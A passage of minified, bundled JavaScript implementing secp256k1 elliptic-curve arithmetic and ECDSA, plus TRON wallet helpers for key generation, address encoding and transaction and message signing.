                        return !r.isOdd(e);
                    throw new Error("Field doesn't support isOdd")
                }
                equals(e) {
                    u(e);
                    const {px: t, py: n, pz: o} = this
                      , {px: i, py: s, pz: a} = e
                      , c = r.eql(r.mul(t, a), r.mul(i, o))
                      , l = r.eql(r.mul(n, a), r.mul(s, o));
                    return c && l
                }
                negate() {
                    return new d(this.px,r.neg(this.py),this.pz)
                }
                double() {
                    const {a: e, b: n} = t
                      , o = r.mul(n, Hz)
                      , {px: i, py: s, pz: a} = this;
                    let c = r.ZERO
                      , l = r.ZERO
                      , u = r.ZERO
                      , h = r.mul(i, i)
                      , f = r.mul(s, s)
                      , p = r.mul(a, a)
                      , g = r.mul(i, s);
                    return g = r.add(g, g),
                    u = r.mul(i, a),
                    u = r.add(u, u),
                    c = r.mul(e, u),
                    l = r.mul(o, p),
                    l = r.add(c, l),
                    c = r.sub(f, l),
                    l = r.add(f, l),
                    l = r.mul(c, l),
                    c = r.mul(g, c),
                    u = r.mul(o, u),
                    p = r.mul(e, p),
                    g = r.sub(h, p),
                    g = r.mul(e, g),
                    g = r.add(g, u),
                    u = r.add(h, h),
                    h = r.add(u, h),
                    h = r.add(h, p),
                    h = r.mul(h, g),
                    l = r.add(l, h),
                    p = r.mul(s, a),
                    p = r.add(p, p),
                    h = r.mul(p, g),
                    c = r.sub(c, h),
                    u = r.mul(p, f),
                    u = r.add(u, u),
                    u = r.add(u, u),
                    new d(c,l,u)
                }
                add(e) {
                    u(e);
                    const {px: n, py: o, pz: i} = this
                      , {px: s, py: a, pz: c} = e;
                    let l = r.ZERO
                      , h = r.ZERO
                      , f = r.ZERO;
                    const p = t.a
                      , g = r.mul(t.b, Hz);
                    let y = r.mul(n, s)
                      , m = r.mul(o, a)
                      , b = r.mul(i, c)
                      , v = r.add(n, o)
                      , w = r.add(s, a);
                    v = r.mul(v, w),
                    w = r.add(y, m),
                    v = r.sub(v, w),
                    w = r.add(n, i);
                    let T = r.add(s, c);
                    return w = r.mul(w, T),
                    T = r.add(y, b),
                    w = r.sub(w, T),
                    T = r.add(o, i),
                    l = r.add(a, c),
                    T = r.mul(T, l),
                    l = r.add(m, b),
                    T = r.sub(T, l),
                    f = r.mul(p, w),
                    l = r.mul(g, b),
                    f = r.add(l, f),
                    l = r.sub(m, f),
                    f = r.add(m, f),
                    h = r.mul(l, f),
                    m = r.add(y, y),
                    m = r.add(m, y),
                    b = r.mul(p, b),
                    w = r.mul(g, w),
                    m = r.add(m, b),
                    b = r.sub(y, b),
                    b = r.mul(p, b),
                    w = r.add(w, b),
                    y = r.mul(m, w),
                    h = r.add(h, y),
                    y = r.mul(T, w),
                    l = r.mul(v, l),
                    l = r.sub(l, y),
                    y = r.mul(v, m),
                    f = r.mul(T, f),
                    f = r.add(f, y),
                    new d(l,h,f)
                }
                subtract(e) {
                    return this.add(e.negate())
                }
                is0() {
                    return this.equals(d.ZERO)
                }
                wNAF(e) {
                    return f.wNAFCached(this, l, e, (e => {
                        const t = r.invertBatch(e.map((e => e.pz)));
                        return e.map(( (e, r) => e.toAffine(t[r]))).map(d.fromAffine)
                    }
                    ))
                }
                multiplyUnsafe(e) {
                    const n = d.ZERO;
                    if (e === zz)
                        return n;
                    if (a(e),
                    e === Vz)
                        return this;
                    const {endo: o} = t;
                    if (!o)
                        return f.unsafeLadder(this, e);
                    let {k1neg: i, k1: s, k2neg: c, k2: l} = o.splitScalar(e)
                      , u = n
                      , h = n
                      , p = this;
                    for (; s > zz || l > zz; )
                        s & Vz && (u = u.add(p)),
                        l & Vz && (h = h.add(p)),
                        p = p.double(),
                        s >>= Vz,
                        l >>= Vz;
                    return i && (u = u.negate()),
                    c && (h = h.negate()),
                    h = new d(r.mul(h.px, o.beta),h.py,h.pz),
                    u.add(h)
                }
                multiply(e) {
                    a(e);
                    let n, o, i = e;
                    const {endo: s} = t;
                    if (s) {
                        const {k1neg: e, k1: t, k2neg: a, k2: c} = s.splitScalar(i);
                        let {p: l, f: u} = this.wNAF(t)
                          , {p: h, f: p} = this.wNAF(c);
                        l = f.constTimeNegate(e, l),
                        h = f.constTimeNegate(a, h),
                        h = new d(r.mul(h.px, s.beta),h.py,h.pz),
                        n = l.add(h),
                        o = u.add(p)
                    } else {
                        const {p: e, f: t} = this.wNAF(i);
                        n = e,
                        o = t
                    }
                    return d.normalizeZ([n, o])[0]
                }
                multiplyAndAddUnsafe(e, t, r) {
                    const n = d.BASE
                      , o = (e, t) => t !== zz && t !== Vz && e.equals(n) ? e.multiply(t) : e.multiplyUnsafe(t)
                      , i = o(this, t).add(o(e, r));
                    return i.is0() ? void 0 : i
                }
                toAffine(e) {
                    const {px: t, py: n, pz: o} = this
                      , i = this.is0();
                    null == e && (e = i ? r.ONE : r.inv(o));
                    const s = r.mul(t, e)
                      , a = r.mul(n, e)
                      , c = r.mul(o, e);
                    if (i)
                        return {
                            x: r.ZERO,
                            y: r.ZERO
                        };
                    if (!r.eql(c, r.ONE))
                        throw new Error("invZ was invalid");
                    return {
                        x: s,
                        y: a
                    }
                }
                isTorsionFree() {
                    const {h: e, isTorsionFree: r} = t;
                    if (e === Vz)
                        return !0;
                    if (r)
                        return r(d, this);
                    throw new Error("isTorsionFree() has not been declared for the elliptic curve")
                }
                clearCofactor() {
                    const {h: e, clearCofactor: r} = t;
                    return e === Vz ? this : r ? r(d, this) : this.multiplyUnsafe(t.h)
                }
                toRawBytes() {
                    let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                    return this.assertValidity(),
                    n(d, this, e)
                }
                toHex() {
                    let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                    return nz(this.toRawBytes(e))
                }
            }
            d.BASE = new d(t.Gx,t.Gy,r.ONE),
            d.ZERO = new d(r.ZERO,r.ONE,r.ZERO);
            const h = t.nBitLength
              , f = function(e, t) {
                const r = (e, t) => {
                    const r = t.negate();
                    return e ? r : t
                }
                  , n = e => ({
                    windows: Math.ceil(t / e) + 1,
                    windowSize: 2 ** (e - 1)
                });
                return {
                    constTimeNegate: r,
                    unsafeLadder(t, r) {
                        let n = e.ZERO
                          , o = t;
                        for (; r > Nz; )
                            r & Fz && (n = n.add(o)),
                            o = o.double(),
                            r >>= Fz;
                        return n
                    },
                    precomputeWindow(e, t) {
                        const {windows: r, windowSize: o} = n(t)
                          , i = [];
                        let s = e
                          , a = s;
                        for (let n = 0; n < r; n++) {
                            a = s,
                            i.push(a);
                            for (let e = 1; e < o; e++)
                                a = a.add(s),
                                i.push(a);
                            s = a.double()
                        }
                        return i
                    },
                    wNAF(t, o, i) {
                        const {windows: s, windowSize: a} = n(t);
                        let c = e.ZERO
                          , l = e.BASE;
                        const u = BigInt(2 ** t - 1)
                          , d = 2 ** t
                          , h = BigInt(t);
                        for (let e = 0; e < s; e++) {
                            const t = e * a;
                            let n = Number(i & u);
                            i >>= h,
                            n > a && (n -= d,
                            i += Fz);
                            const s = t
                              , f = t + Math.abs(n) - 1
                              , p = e % 2 !== 0
                              , g = n < 0;
                            0 === n ? l = l.add(r(p, o[s])) : c = c.add(r(g, o[f]))
                        }
                        return {
                            p: c,
                            f: l
                        }
                    },
                    wNAFCached(e, t, r, n) {
                        const o = e._WINDOW_SIZE || 1;
                        let i = t.get(e);
                        return i || (i = this.precomputeWindow(e, o),
                        1 !== o && t.set(e, n(i))),
                        this.wNAF(o, i, r)
                    }
                }
            }(d, t.endo ? Math.ceil(h / 2) : h);
            return {
                CURVE: t,
                ProjectivePoint: d,
                normPrivateKeyToScalar: c,
                weierstrassEquation: i,
                isWithinCurveOrder: s
            }
        }
        function Gz(e) {
            const t = function(e) {
                const t = Uz(e);
                return vz(t, {
                    hash: "hash",
                    hmac: "function",
                    randomBytes: "function"
                }, {
                    bits2int: "function",
                    bits2int_modN: "function",
                    lowS: "boolean"
                }),
                Object.freeze((0,
                k.A)({
                    lowS: !0
                }, t))
            }(e)
              , {Fp: r, n: n} = t
              , o = r.BYTES + 1
              , i = 2 * r.BYTES + 1;
            function s(e) {
                return Iz(e, n)
            }
            function a(e) {
                return Oz(e, n)
            }
            const {ProjectivePoint: c, normPrivateKeyToScalar: l, weierstrassEquation: u, isWithinCurveOrder: d} = qz((0,
            k.A)((0,
            k.A)({}, t), {}, {
                toBytes(e, t, n) {
                    const o = t.toAffine()
                      , i = r.toBytes(o.x)
                      , s = fz;
                    return n ? s(Uint8Array.from([t.hasEvenY() ? 2 : 3]), i) : s(Uint8Array.from([4]), i, r.toBytes(o.y))
                },
                fromBytes(e) {
                    const t = e.length
                      , n = e[0]
                      , s = e.subarray(1);
                    if (t !== o || 2 !== n && 3 !== n) {
                        if (t === i && 4 === n) {
                            return {
                                x: r.fromBytes(s.subarray(0, r.BYTES)),
                                y: r.fromBytes(s.subarray(r.BYTES, 2 * r.BYTES))
                            }
                        }
                        throw new Error("Point of length ".concat(t, " was invalid. Expected ").concat(o, " compressed bytes or ").concat(i, " uncompressed bytes"))
                    }
                    {
                        const e = cz(s);
                        if (!(zz < (a = e) && a < r.ORDER))
                            throw new Error("Point is not on curve");
                        const t = u(e);
                        let o;
                        try {
                            o = r.sqrt(t)
                        } catch (c) {
                            const e = c instanceof Error ? ": " + c.message : "";
                            throw new Error("Point is not on curve" + e)
                        }
                        return 1 === (1 & n) !== ((o & Vz) === Vz) && (o = r.neg(o)),
                        {
                            x: e,
                            y: o
                        }
                    }
                    var a
                }
            }))
              , h = e => nz(uz(e, t.nByteLength));
            function f(e) {
                return e > n >> Vz
            }
            const p = (e, t, r) => cz(e.slice(t, r));
            class g {
                constructor(e, t, r) {
                    this.r = e,
                    this.s = t,
                    this.recovery = r,
                    this.assertValidity()
                }
                static fromCompact(e) {
                    const r = t.nByteLength;
                    return e = hz("compactSignature", e, 2 * r),
                    new g(p(e, 0, r),p(e, r, 2 * r))
                }
                static fromDER(e) {
                    const {r: t, s: r} = jz.toSig(hz("DER", e));
                    return new g(t,r)
                }
                assertValidity() {
                    if (!d(this.r))
                        throw new Error("r must be 0 < r < CURVE.n");
                    if (!d(this.s))
                        throw new Error("s must be 0 < s < CURVE.n")
                }
                addRecoveryBit(e) {
                    return new g(this.r,this.s,e)
                }
                recoverPublicKey(e) {
                    const {r: n, s: o, recovery: i} = this
                      , l = v(hz("msgHash", e));
                    if (null == i || ![0, 1, 2, 3].includes(i))
                        throw new Error("recovery id invalid");
                    const u = 2 === i || 3 === i ? n + t.n : n;
                    if (u >= r.ORDER)
                        throw new Error("recovery id 2 or 3 invalid");
                    const d = 0 === (1 & i) ? "02" : "03"
                      , f = c.fromHex(d + h(u))
                      , p = a(u)
                      , g = s(-l * p)
                      , y = s(o * p)
                      , m = c.BASE.multiplyAndAddUnsafe(f, g, y);
                    if (!m)
                        throw new Error("point at infinify");
                    return m.assertValidity(),
                    m
                }
                hasHighS() {
                    return f(this.s)
                }
                normalizeS() {
                    return this.hasHighS() ? new g(this.r,s(-this.s),this.recovery) : this
                }
                toDERRawBytes() {
                    return az(this.toDERHex())
                }
                toDERHex() {
                    return jz.hexFromSig({
                        r: this.r,
                        s: this.s
                    })
                }
                toCompactRawBytes() {
                    return az(this.toCompactHex())
                }
                toCompactHex() {
                    return h(this.r) + h(this.s)
                }
            }
            const y = {
                isValidPrivateKey(e) {
                    try {
                        return l(e),
                        !0
                    } catch (t) {
                        return !1
                    }
                },
                normPrivateKeyToScalar: l,
                randomPrivateKey: () => {
                    const e = Mz(t.n);
                    return function(e, t) {
                        let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                        const n = e.length
                          , o = kz(t)
                          , i = Mz(t);
                        if (n < 16 || n < i || n > 1024)
                            throw new Error("expected ".concat(i, "-1024 bytes of input, got ").concat(n));
                        const s = Iz(r ? cz(e) : lz(e), t - Tz) + Tz;
                        return r ? dz(s, o) : uz(s, o)
                    }(t.randomBytes(e), t.n)
                }
                ,
                precompute() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8
                      , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : c.BASE;
                    return t._setWindowSize(e),
                    t.multiply(BigInt(3)),
                    t
                }
            };
            function m(e) {
                const t = ez(e)
                  , r = "string" === typeof e
                  , n = (t || r) && e.length;
                return t ? n === o || n === i : r ? n === 2 * o || n === 2 * i : e instanceof c
            }
            const b = t.bits2int || function(e) {
                const r = cz(e)
                  , n = 8 * e.length - t.nBitLength;
                return n > 0 ? r >> BigInt(n) : r
            }
              , v = t.bits2int_modN || function(e) {
                return s(b(e))
            }
              , w = pz(t.nBitLength);
            function T(e) {
                if ("bigint" !== typeof e)
                    throw new Error("bigint expected");
                if (!(zz <= e && e < w))
                    throw new Error("bigint expected < 2^".concat(t.nBitLength));
                return uz(e, t.nByteLength)
            }
            function A(e, n) {
                let o = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : E;
                if (["recovered", "canonical"].some((e => e in o)))
                    throw new Error("sign() legacy options not supported");
                const {hash: i, randomBytes: u} = t;
                let {lowS: h, prehash: p, extraEntropy: y} = o;
                null == h && (h = !0),
                e = hz("msgHash", e),
                p && (e = hz("prehashed msgHash", i(e)));
                const m = v(e)
                  , w = l(n)
                  , A = [T(w), T(m)];
                if (null != y && !1 !== y) {
                    const e = !0 === y ? u(r.BYTES) : y;
                    A.push(hz("extraEntropy", e))
                }
                const P = fz(...A)
                  , C = m;
                return {
                    seed: P,
                    k2sig: function(e) {
                        const t = b(e);
                        if (!d(t))
                            return;
                        const r = a(t)
                          , n = c.BASE.multiply(t).toAffine()
                          , o = s(n.x);
                        if (o === zz)
                            return;
                        const i = s(r * s(C + o * w));
                        if (i === zz)
                            return;
                        let l = (n.x === o ? 0 : 2) | Number(n.y & Vz)
                          , u = i;
                        return h && f(i) && (u = function(e) {
                            return f(e) ? s(-e) : e
                        }(i),
                        l ^= 1),
                        new g(o,u,l)
                    }
                }
            }
            const E = {
                lowS: t.lowS,
                prehash: !1
            }
              , P = {
                lowS: t.lowS,
                prehash: !1
            };
            return c.BASE._setWindowSize(8),
            {
                CURVE: t,
                getPublicKey: function(e) {
                    let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                    return c.fromPrivateKey(e).toRawBytes(t)
                },
                getSharedSecret: function(e, t) {
                    let r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                    if (m(e))
                        throw new Error("first arg must be private key");
                    if (!m(t))
                        throw new Error("second arg must be public key");
                    return c.fromHex(t).multiply(l(e)).toRawBytes(r)
                },
                sign: function(e, r) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : E;
                    const {seed: o, k2sig: i} = A(e, r, n)
                      , s = t;
                    return mz(s.hash.outputLen, s.nByteLength, s.hmac)(o, i)
                },
                verify: function(e, r, n) {
                    var o;
                    let i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : P;
                    const l = e;
                    if (r = hz("msgHash", r),
                    n = hz("publicKey", n),
                    "strict"in i)
                        throw new Error("options.strict was renamed to lowS");
                    const {lowS: u, prehash: d} = i;
                    let h, f;
                    try {
                        if ("string" === typeof l || ez(l))
                            try {
                                h = g.fromDER(l)
                            } catch (E) {
                                if (!(E instanceof jz.Err))
                                    throw E;
                                h = g.fromCompact(l)
                            }
                        else {
                            if ("object" !== typeof l || "bigint" !== typeof l.r || "bigint" !== typeof l.s)
                                throw new Error("PARSE");
                            {
                                const {r: e, s: t} = l;
                                h = new g(e,t)
                            }
                        }
                        f = c.fromHex(n)
                    } catch (C) {
                        if ("PARSE" === C.message)
                            throw new Error("signature must be Signature instance, Uint8Array or hex string");
                        return !1
                    }
                    if (u && h.hasHighS())
                        return !1;
                    d && (r = t.hash(r));
                    const {r: p, s: y} = h
                      , m = v(r)
                      , b = a(y)
                      , w = s(m * b)
                      , T = s(p * b)
                      , A = null === (o = c.BASE.multiplyAndAddUnsafe(f, w, T)) || void 0 === o ? void 0 : o.toAffine();
                    return !!A && s(A.x) === p
                },
                ProjectivePoint: c,
                Signature: g,
                utils: y
            }
        }
        function $z(e) {
            return {
                hash: e,
                hmac: function(t) {
                    for (var r = arguments.length, n = new Array(r > 1 ? r - 1 : 0), o = 1; o < r; o++)
                        n[o - 1] = arguments[o];
                    return Jj(e, t, function() {
                        let e = 0;
                        for (let r = 0; r < arguments.length; r++) {
                            const t = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                            _j(t),
                            e += t.length
                        }
                        const t = new Uint8Array(e);
                        for (let r = 0, n = 0; r < arguments.length; r++) {
                            const e = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                            t.set(e, n),
                            n += e.length
                        }
                        return t
                    }(...n))
                },
                randomBytes: jj
            }
        }
        const Kz = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f")
          , Zz = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141")
          , Yz = BigInt(1)
          , Jz = BigInt(2)
          , Xz = (e, t) => (e + t / Jz) / t;
        function Qz(e) {
            const t = Kz
              , r = BigInt(3)
              , n = BigInt(6)
              , o = BigInt(11)
              , i = BigInt(22)
              , s = BigInt(23)
              , a = BigInt(44)
              , c = BigInt(88)
              , l = e * e * e % t
              , u = l * l * e % t
              , d = xz(u, r, t) * u % t
              , h = xz(d, r, t) * u % t
              , f = xz(h, Jz, t) * l % t
              , p = xz(f, o, t) * f % t
              , g = xz(p, i, t) * p % t
              , y = xz(g, a, t) * g % t
              , m = xz(y, c, t) * y % t
              , b = xz(m, a, t) * g % t
              , v = xz(b, r, t) * u % t
              , w = xz(v, s, t) * p % t
              , T = xz(w, n, t) * l % t
              , A = xz(T, Jz, t);
            if (!eV.eql(eV.sqr(A), e))
                throw new Error("Cannot find square root");
            return A
        }
        const eV = function(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2]
              , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
            if (e <= wz)
                throw new Error("Expected Field ORDER > 0, got ".concat(e));
            const {nBitLength: o, nByteLength: i} = Rz(e, t);
            if (i > 2048)
                throw new Error("Field lengths over 2048 bytes are not supported");
            const s = _z(e)
              , a = Object.freeze({
                ORDER: e,
                BITS: o,
                BYTES: i,
                MASK: pz(o),
                ZERO: wz,
                ONE: Tz,
                create: t => Iz(t, e),
                isValid: t => {
                    if ("bigint" !== typeof t)
                        throw new Error("Invalid field element: expected bigint, got ".concat(typeof t));
                    return wz <= t && t < e
                }
                ,
                is0: e => e === wz,
                isOdd: e => (e & Tz) === Tz,
                neg: t => Iz(-t, e),
                eql: (e, t) => e === t,
                sqr: t => Iz(t * t, e),
                add: (t, r) => Iz(t + r, e),
                sub: (t, r) => Iz(t - r, e),
                mul: (t, r) => Iz(t * r, e),
                pow: (e, t) => function(e, t, r) {
                    if (r < wz)
                        throw new Error("Expected power > 0");
                    if (r === wz)
                        return e.ONE;
                    if (r === Tz)
                        return t;
                    let n = e.ONE
                      , o = t;
                    for (; r > wz; )
                        r & Tz && (n = e.mul(n, o)),
                        o = e.sqr(o),
                        r >>= Tz;
                    return n
                }(a, e, t),
                div: (t, r) => Iz(t * Oz(r, e), e),
                sqrN: e => e * e,
                addN: (e, t) => e + t,
                subN: (e, t) => e - t,
                mulN: (e, t) => e * t,
                inv: t => Oz(t, e),
                sqrt: n.sqrt || (e => s(a, e)),
                invertBatch: e => function(e, t) {
                    const r = new Array(t.length)
                      , n = t.reduce(( (t, n, o) => e.is0(n) ? t : (r[o] = t,
                    e.mul(t, n))), e.ONE)
                      , o = e.inv(n);
                    return t.reduceRight(( (t, n, o) => e.is0(n) ? t : (r[o] = e.mul(t, r[o]),
                    e.mul(t, n))), o),
                    r
                }(a, e),
                cmov: (e, t, r) => r ? t : e,
                toBytes: e => r ? dz(e, i) : uz(e, i),
                fromBytes: e => {
                    if (e.length !== i)
                        throw new Error("Fp.fromBytes: expected ".concat(i, ", got ").concat(e.length));
                    return r ? lz(e) : cz(e)
                }
            });
            return Object.freeze(a)
        }(Kz, void 0, void 0, {
            sqrt: Qz
        })
          , tV = function(e, t) {
            const r = t => Gz((0,
            k.A)((0,
            k.A)({}, e), $z(t)));
            return Object.freeze((0,
            k.A)((0,
            k.A)({}, r(t)), {}, {
                create: r
            }))
        }({
            a: BigInt(0),
            b: BigInt(7),
            Fp: eV,
            n: Zz,
            Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
            Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
            h: BigInt(1),
            lowS: !0,
            endo: {
                beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
                splitScalar: e => {
                    const t = Zz
                      , r = BigInt("0x3086d221a7d46bcde86c90e49284eb15")
                      , n = -Yz * BigInt("0xe4437ed6010e88286f547fa90abfe4c3")
                      , o = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8")
                      , i = r
                      , s = BigInt("0x100000000000000000000000000000000")
                      , a = Xz(i * e, t)
                      , c = Xz(-n * e, t);
                    let l = Iz(e - a * r - c * o, t)
                      , u = Iz(-a * n - c * i, t);
                    const d = l > s
                      , h = u > s;
                    if (d && (l = t - l),
                    h && (u = t - u),
                    l > s || u > s)
                        throw new Error("splitScalar: Endomorphism failed, k=" + e);
                    return {
                        k1neg: d,
                        k1: l,
                        k2neg: h,
                        k2: u
                    }
                }
            }
        }, Zj);
        BigInt(0);
        tV.ProjectivePoint;
        function rV(e) {
            const t = wV(e);
            let r = wV(t).slice(0, 4);
            return r = e.concat(r),
            lF(r)
        }
        function nV(e) {
            if ("string" != typeof e)
                return !1;
            if (e.length <= 4)
                return !1;
            let t = uF(e);
            if (e.length <= 4)
                return !1;
            const r = t.length - 4
              , n = t.slice(r);
            t = t.slice(0, r);
            const o = wV(t)
              , i = wV(o).slice(0, 4);
            if (n[0] == i[0] && n[1] == i[1] && n[2] == i[2] && n[3] == i[3])
                return t;
            throw new Error("Invalid address provided")
        }
        function oV(e, t) {
            "string" === typeof e && (e = MC(e));
            const r = vV(MC(t.txID), e);
            return Array.isArray(t.signature) ? t.signature.includes(r) || t.signature.push(r) : t.signature = [r],
            t
        }
        function iV(e, t) {
            e = "0x" + e.replace(/^0x/, ""),
            t = "0x" + t.replace(/^0x/, "");
            const r = jO(qN(e), PI.from(t));
            return ZN + r.substring(2)
        }
        function sV(e) {
            return btoa(String.fromCharCode(...e))
        }
        function aV(e, t) {
            "string" === typeof e && (e = MC(e));
            return vV(wV(t), e)
        }
        function cV(e, t, r, n) {
            const o = "0x".concat(n.replace(/^0x/, ""))
              , i = new DO(o)
              , s = Bj.hash(e, t, r)
              , a = i.sign(s);
            return ["0x", a.r.substring(2), a.s.substring(2), Number(a.v).toString(16)].join("")
        }
        function lV(e) {
            const t = BC(e);
            return globalThis.proto.protocol.Transaction.deserializeBinary(t).getRawData().serializeBinary()
        }
        function uV() {
            let e = IC(tV.utils.randomPrivateKey());
            return e = e.padStart(64, "0"),
            MC(e)
        }
        function dV(e) {
            65 === e.length && (e = e.slice(1));
            const t = ix(new Uint8Array(e)).toString().substring(2);
            return MC(ZN + t.substring(24))
        }
        function hV(e) {
            return dV(bV(e))
        }
        function fV(e) {
            const t = uF(e);
            if (t.length <= 4)
                return !1;
            const r = t.slice(0, t.length - 4)
              , n = wV(r)
              , o = wV(n);
            return o[0] === t[r.length] && o[1] === t[r.length + 1] && o[2] === t[r.length + 2] && o[3] === t[r.length + 3] && r
        }
        function pV(e) {
            if ("string" !== typeof e)
                return !1;
            if (e.length !== KN)
                return !1;
            let t = uF(e);
            if (25 !== t.length)
                return !1;
            if (t[0] !== YN)
                return !1;
            const r = t.slice(21);
            t = t.slice(0, 21);
            const n = wV(t)
              , o = wV(n).slice(0, 4);
            return r[0] == o[0] && r[1] == o[1] && r[2] == o[2] && r[3] == o[3]
        }
        function gV(e) {
            return rV(dV(bV(BC(e))))
        }
        function yV(e) {
            return IC(dV(bV(BC(e))))
        }
        function mV(e) {
            return xC(dV(bV(BC(e))))
        }
        function bV(e) {
            const t = tV.ProjectivePoint.fromPrivateKey(new Uint8Array(function(e) {
                return MC(IC(e).padStart(64, "0"))
            }(e)))
              , r = t.x
              , n = t.y
              , o = r.toString(16).padStart(64, "0")
              , i = n.toString(16).padStart(64, "0");
            return MC("04".concat(o).concat(i))
        }
        function vV(e, t) {
            const r = tV.sign(IC(e), IC(t))
              , n = r.r.toString(16)
              , o = r.s.toString(16)
              , i = r.recovery + 27;
            return n.padStart(64, "0") + o.padStart(64, "0") + PC(i)
        }
        function wV(e) {
            return MC(BB("0x" + IC(e)).replace(/^0x/, ""))
        }
        function TV(e) {
            return rV(hV(BC(e)))
        }
        function AV(e) {
            return rV(hV(MC(e, arguments.length > 1 && void 0 !== arguments[1] && arguments[1])))
        }
        function EV(e) {
            return (!(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1] ? "0x" : "") + ix(Buffer.from(e, "utf-8")).toString().substring(2)
        }
        const PV = "Invalid tron path provided";
        function CV() {
            const e = uV()
              , t = bV(e)
              , r = hV(e);
            return {
                privateKey: IC(e),
                publicKey: IC(t),
                address: {
                    base58: rV(r),
                    hex: IC(r)
                }
            }
        }
        function SV() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ""
              , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : QN
              , r = arguments.length > 2 ? arguments[2] : void 0;
            const n = IM.createRandom(e, t, r);
            return {
                mnemonic: n.mnemonic,
                privateKey: n.privateKey,
                publicKey: n.signingKey.publicKey,
                address: AV(n.privateKey.replace(/^0x/, "")),
                path: n.path
            }
        }
        function IV(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : QN
              , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : ""
              , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : null;
            if (!String(t).match(/^m\/44\'\/195\'/))
                throw new Error(PV);
            const o = IM.fromMnemonic(Px.fromPhrase(e, r, n), t);
            return {
                mnemonic: o.mnemonic,
                privateKey: o.privateKey,
                publicKey: o.signingKey.publicKey,
                address: AV(o.privateKey.replace(/^0x/, ""))
            }
        }
        const BV = "\x19TRON Signed Message:\n";
        function xV(e) {
            return "string" === typeof e ? e = FB(e) : Array.isArray(e) && (e = new Uint8Array(e)),
            ix(KS([FB(BV), FB(String(e.length)), e]))
        }
        function OV(e, t) {
            t.match(/^0x/) || (t = "0x" + t);
            const r = new DO(t)
              , n = xV(e)
              , o = r.sign(n);
            return HN(o)
        }
        function _V(e, t) {
            t.match(/^0x/) || (t = "0x" + t);
            return rV(MC(jO(xV(e), t).replace(/^0x/, ZN)))
        }
        const WV = (0,
        k.A)((0,
        k.A)({}, m), {}, {
            address: w,
            code: y,
            accounts: I,
            base58: T,
            bytes: g,
            crypto: S,
            abi: E,
            message: B,
            _TypedDataEncoder: Bj,
            transaction: P,
            ethersUtils: v
        });
        var RV, kV, MV, NV;
        !function(e) {
            e[e.BANDWIDTH = 0] = "BANDWIDTH",
            e[e.ENERGY = 1] = "ENERGY",
            e[e.TRON_POWER = 2] = "TRON_POWER"
        }(RV || (RV = {})),
        function(e) {
            e.ENOUGH_PERMISSION = "ENOUGH_PERMISSION",
            e.NOT_ENOUGH_PERMISSION = "NOT_ENOUGH_PERMISSION",
            e.SIGNATURE_FORMAT_ERROR = "SIGNATURE_FORMAT_ERROR",
            e.COMPUTE_ADDRESS_ERROR = "COMPUTE_ADDRESS_ERROR",
            e.PERMISSION_ERROR = "PERMISSION_ERROR",
            e.OTHER_ERROR = "OTHER_ERROR"
        }(kV || (kV = {})),
        function(e) {
            e[e.SUCCESS = 0] = "SUCCESS",
            e[e.SIGERROR = 1] = "SIGERROR",
            e[e.CONTRACT_VALIDATE_ERROR = 2] = "CONTRACT_VALIDATE_ERROR",
            e[e.CONTRACT_EXE_ERROR = 3] = "CONTRACT_EXE_ERROR",
            e[e.BANDWITH_ERROR = 4] = "BANDWITH_ERROR",
            e[e.DUP_TRANSACTION_ERROR = 5] = "DUP_TRANSACTION_ERROR",
            e[e.TAPOS_ERROR = 6] = "TAPOS_ERROR",
            e[e.TOO_BIG_TRANSACTION_ERROR = 7] = "TOO_BIG_TRANSACTION_ERROR",
            e[e.TRANSACTION_EXPIRATION_ERROR = 8] = "TRANSACTION_EXPIRATION_ERROR",
            e[e.SERVER_BUSY = 9] = "SERVER_BUSY",
            e[e.NO_CONNECTION = 10] = "NO_CONNECTION",
            e[e.NOT_ENOUGH_EFFECTIVE_CONNECTION = 11] = "NOT_ENOUGH_EFFECTIVE_CONNECTION",
            e[e.OTHER_ERROR = 20] = "OTHER_ERROR"
        }(MV || (MV = {})),
        function(e) {
            e[e.PENDING = 0] = "PENDING",
            e[e.DISAPPROVED = 1] = "DISAPPROVED",
            e[e.APPROVED = 2] = "APPROVED",
            e[e.CANCELED = 3] = "CANCELED"
        }(NV || (NV = {}));
        const FV = !1
          , UV = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
          , DV = "TXjakjptEVf2kJHGSru82ZeVdfMq6Tsbp4"
          , LV = DV
          , jV = "TNGzFLvosUuwBbojGQ7bFy4jANer8NC7KB";
        function zV(e, t) {
            return function() {
                return e.apply(t, arguments)
            }
        }
        const {toString: VV} = Object.prototype
          , {getPrototypeOf: HV} = Object
          , {iterator: qV, toStringTag: GV} = Symbol
          , $V = (e => t => {
            const r = VV.call(t);
            return e[r] || (e[r] = r.slice(8, -1).toLowerCase())
        }
        )(Object.create(null))
          , KV = e => (e = e.toLowerCase(),
        t => $V(t) === e)
          , ZV = e => t => typeof t === e
          , {isArray: YV} = Array
          , JV = ZV("undefined");
        const XV = KV("ArrayBuffer");
